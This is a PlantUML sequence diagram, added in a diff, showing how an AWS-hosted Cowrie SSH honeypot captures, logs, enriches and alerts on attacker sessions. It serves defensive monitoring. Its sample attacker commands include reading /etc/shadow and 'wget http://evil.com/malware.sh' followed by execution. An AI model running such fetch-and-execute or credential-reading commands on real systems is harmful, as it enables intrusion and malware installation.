@@ -1,0 +1,181 @@
+@startuml Operational Sequence
+title AWS Honeypot Operational Flow - Complete System Lifecycle
+
+skinparam sequence {
+    ArrowColor #FF9900
+    ActorBorderColor #232F3E
+    LifeLineBorderColor #232F3E
+    ParticipantBorderColor #232F3E
+    ParticipantBackgroundColor #FFFFFF
+    ActorBackgroundColor #E8F4F8
+}
+
+actor "Threat Actor" as attacker
+participant "Internet Gateway" as igw
+participant "AWS Security Group" as sg
+participant "EC2 Instance\ni-04d996c187504b547\n44.218.220.47" as ec2
+participant "Cowrie Honeypot\nPort 2222" as cowrie
+participant "cowrie.conf" as config
+participant "Fake Filesystem" as fs
+participant "JSON Logger\n/var/log/cowrie.json" as logger
+participant "IP Whitelist Filter\nip_whitelist.py" as filter
+participant "Event Processor" as events
+participant "GreyNoise API" as greynoise
+participant "Discord Integration" as discord
+participant "Discord Webhook" as webhook
+participant "CloudWatch Logs" as cloudwatch
+participant "Team Members" as team
+participant "AWS SSM" as ssm
+
+== System Initialization ==
+team -> ec2 : Deploy infrastructure
+ec2 -> cowrie : Start Cowrie service
+cowrie -> config : Load configuration\n- Port: 2222\n- Timeout: 600s\n- Plugins enabled
+config -> fs : Initialize fake filesystem
+config -> logger : Configure JSON logging
+config -> discord : Load webhook config
+cowrie -> ec2 : **ACTIVE**: Listening on 0.0.0.0:2222
+ec2 -> team : System ready
+
+note over cowrie
+  Cowrie v2.5.0 initialized
+  - SSH/Telnet emulation active
+  - Event logging enabled
+  - Discord integration ready
+end note
+
+== Attack Detection ==
+attacker -> igw : Port scan\n(nmap, masscan, etc.)
+igw -> sg : Inbound traffic
+sg -> ec2 : Allow port 2222\n(Security Group Rule)
+ec2 -> cowrie : Forward connection
+cowrie -> logger : **LOG**: cowrie.session.connect\n{src_ip, timestamp, port}
+cowrie -> attacker : SSH banner\n"SSH-2.0-OpenSSH_6.0p1"
+
+== Authentication Phase ==
+attacker -> cowrie : SSH connection\nUsername: root
+attacker -> cowrie : Password: password123
+cowrie -> logger : **LOG**: cowrie.login.success\n{username, password, src_ip}
+cowrie -> events : Process login event
+events -> filter : Check IP whitelist
+filter -> events : Not whitelisted\n(Not team IP)
+cowrie -> attacker : Authentication accepted\n(Fake shell prompt)
+
+note over events, filter
+  IP Filtering Logic:
+  - Check against team whitelist
+  - Suppress alerts for known IPs
+  - Pass through unknown IPs
+end note
+
+== Session Interaction ==
+attacker -> cowrie : Command: whoami
+cowrie -> fs : Query fake /etc/passwd
+fs -> cowrie : Return: root
+cowrie -> attacker : root
+cowrie -> logger : **LOG**: cowrie.command.input\n{command: "whoami"}
+
+attacker -> cowrie : Command: ls -la /root
+cowrie -> fs : List fake directory
+fs -> cowrie : Fake file listing
+cowrie -> attacker : Display files
+cowrie -> logger : **LOG**: cowrie.command.input\n{command: "ls -la /root"}
+
+attacker -> cowrie : Command: cat /etc/shadow
+cowrie -> fs : Read fake shadow file
+fs -> cowrie : Fake password hashes
+cowrie -> attacker : Display fake data
+cowrie -> logger : **LOG**: cowrie.command.input\n{command: "cat /etc/shadow"}
+
+== Malicious Activity ==
+attacker -> cowrie : wget http://evil.com/malware.sh
+cowrie -> logger : **LOG**: cowrie.session.file_download\n{url, filename, size}
+cowrie -> fs : Store in fake filesystem
+cowrie -> attacker : Download complete (fake)
+
+attacker -> cowrie : chmod +x malware.sh\n./malware.sh
+cowrie -> logger : **LOG**: cowrie.command.input\n{command: "chmod +x malware.sh"}
+cowrie -> logger : **LOG**: cowrie.command.input\n{command: "./malware.sh"}
+cowrie -> attacker : Simulated execution output
+
+== Threat Intelligence Processing ==
+events -> greynoise : Query IP reputation\n{src_ip}
+greynoise -> events : Threat classification\n{malicious: true, tags: [...]}
+events -> discord : Enrich event metadata\n{greynoise_data}
+
+note over greynoise
+  GreyNoise Threat Scoring:
+  - Known scanner detection
+  - Threat actor classification
+  - Geographic analysis
+  - Historical activity
+end note
+
+== Real-time Alerting ==
+events -> discord : Format alert message
+discord -> webhook : POST webhook payload\n{event_type, src_ip, commands, threat_score}
+webhook -> team : **ALERT**: New attack session\nIP: XXX.XXX.XXX.XXX\nCommands executed
+
+note over webhook, team
+  Discord Alert Contains:
+  - Source IP and location
+  - Username/password attempted
+  - Commands executed
+  - Threat intelligence score
+  - Session timestamp
+end note
+
+== Monitoring and Analysis ==
+logger -> cloudwatch : Stream JSON logs
+cloudwatch -> team : CloudWatch Logs aggregation
+team -> ssm : AWS Systems Manager\nSession Manager
+ssm -> ec2 : Browser-based shell
+team -> ec2 : SSH access (port 22)\nssh -i key.pem ec2-user@44.218.220.47
+
+team -> ec2 : tail -f /opt/cowrie/var/log/cowrie/cowrie.json
+ec2 -> team : **STREAMING**: Live attack logs
+
+note over team
+  Team Access Methods:
+  1. AWS SSM (no SSH keys)
+  2. SSH with keypair
+  3. EC2 Instance Connect
+end note
+
+== Session Termination ==
+attacker -> cowrie : exit
+cowrie -> logger : **LOG**: cowrie.session.closed\n{duration, commands_count}
+cowrie -> events : Process session closed
+events -> discord : Session summary
+discord -> webhook : Final session report
+webhook -> team : **ALERT**: Session ended\nDuration: XX minutes\nCommands: XX
+
+== Post-Attack Forensics ==
+team -> ec2 : Analyze session logs
+team -> ec2 : grep "command.input" cowrie.json
+ec2 -> team : Complete command history
+
+team -> ec2 : Extract downloaded files
+ec2 -> team : Malware samples for analysis
+
+team -> ec2 : Review session recordings
+ec2 -> team : Complete TTY replay data
+
+note over team
+  Forensic Data Available:
+  - Complete session timeline
+  - All commands executed
+  - Files accessed/downloaded
+  - Malware samples captured
+  - Network connections attempted
+  - Authentication credentials used
+end note
+
+== Continuous Operation ==
+cowrie -> ec2 : Continue monitoring
+ec2 -> team : 24/7 threat intelligence gathering
+team -> team : Rotate monitoring duties
+team -> team : Document attack patterns
+team -> team : Update threat database
+
+@enduml
